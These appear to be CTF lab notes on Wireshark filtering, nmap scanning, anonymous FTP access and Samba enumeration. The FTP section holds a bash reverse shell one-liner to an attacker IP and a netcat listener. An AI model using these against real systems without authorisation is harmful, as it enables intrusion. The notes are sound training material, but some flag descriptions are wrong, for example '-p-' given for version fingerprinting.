# The Grinch Really Did Steal Christmas
## Topic and concepts
IP address, Protocols 101, Three-way handshake, TCP reassembling data, 
Network traffic monitor.<br>
* TCP/IP
* PCAPs
* Basic `Wireshark` filtering
* HTTP
* SMB
* NATting
* UDP/IP
* Routing
* SYN
* ACK
* `Wireshark`
* `Wireshark` filters
* Filter operators
* Data exportation from `Wireshark`
* Filter to see HTTP GET requests
## Walkthrough
Filter to identify the IP address initiating a specific protocol:<br>
`icmp`<br>
Filter to get the name of an article an IP address visited:<br>
`http.request.method == GET`<br>
Filter to see a leaked password during the login process with FTP traffic:<br>
`ftp.request` <br>
Identify encrypted protocol
```
open pcap file
take a look the list of info provided
```
Identify an item on a list:
```
http.request.method == GET
Export Objects HTTP
Save selected object
Open local file
```

# What's Under the Christmas Tree?
## Topic and concepts
Nmap, Basic functionalities, Timing templates, NSE, Additional scan types, 
Scans defense.<br>
* Finding port numbers of services running on a IP address
* Determining if the host is up
* Determining the distro running
* Retrieveing the `HTTP-TITLE` of a server
* TCP scanning
* Three-way handshake
* Connect scan
* SYN scan
* Uses of NSE
* Performing OS detection
* IDS (Intrusion Detection)
* IPS (Prevention Systems)
* `Snort`
* `Suricata`
* `pfSense`
## Walkthrough
Provide a script with nmap:
```
--script <name-of-the-script>
```
Perform a SYN scan:
```
-sS <ip>
```
Performe a connect scan:
```
-sT <ip>
```
Determine nmap's performance:
```
-T<number>
```
with `number Îµ [0, 5]`<br>
Identify services running on a server:
```
-A
```
Retrieve the OS:
```
-O
```
Scan a specific port:
```
-p <port-number>
```
Scan a specific range of ports:
```
-p <lower-range>-<upper-range>
```
Scan all ports:
```
-p-
```
Scan using TCP and performing version fingerprinting:
```
-p-
```

# Anyone can be Santa
## Topic and concepts
FTP, No credentials, FTP over terminal, Exploit search.<br>
* `FileZilla`
* FTP servers
* FTP Connections
* Connection ports
* Anonymous mode
## Walkthrough
Access a FTP server:
```
ftp <ip>
```
Check if anonymous mode is enabled: typing
```
anonymous
```
when prompted for the name.<br>
Download a file from FTP server to the local device:
```
get
```
Upload a file from the local device to FTP server
```
put
```
Generat a shell :
```
bash -i >& /dev/tcp/<my-ip-address>/4444 0>&1
```
4444 being a trivial port number.<br>
Catch the connection to get reverse shell:
```
nc -lvnp 4444
```

* NFS (Network File System)
* Share
* Difference between Samba and FTP
* `enum4linux`
* `smbclient`
* Accessing a share with wrong permissions
* Count the number of users on a Samba server

* Identifying a share not requiring a password
## Walkthrough
List all `enum4linux` options:
```
./enum4linux.pl -h
```
List shares:
```
-U
```
List shares:
```
-S
```
Access a Samba server and its shares:
```
smbclient //<instance-ip-address>/<share>
```
Download a file from a share:
```
get
```
Upload a file to a share:
```
put
```
